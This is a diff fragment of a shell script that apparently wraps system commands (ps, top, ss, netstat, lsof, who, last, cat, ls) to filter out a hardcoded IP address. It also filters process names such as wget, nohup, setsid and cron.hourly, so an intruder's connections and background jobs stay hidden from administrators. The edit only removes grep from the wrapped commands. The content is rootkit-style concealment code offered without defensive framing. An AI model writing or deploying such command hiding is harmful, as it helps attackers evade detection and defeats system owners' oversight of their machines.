@@ -10,7 +10,7 @@
 #
 
 IP="10.10.2.4"
-COMMANDS="ps top ss netstat lsof who w last cat ls grep" # don't replace grep or egrep, causes infinite recursion and errors with my other scripts
+COMMANDS="ps top ss netstat lsof who w last cat ls" # don't replace grep or egrep, causes infinite recursion and errors with my other scripts
 
 IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP for use with egrep
 PROCESSES="egrep|sleep|run-parts|cron\.hourly|/usr/sbin/CROND -n|gnano|nohup|setsid|wget|flock"
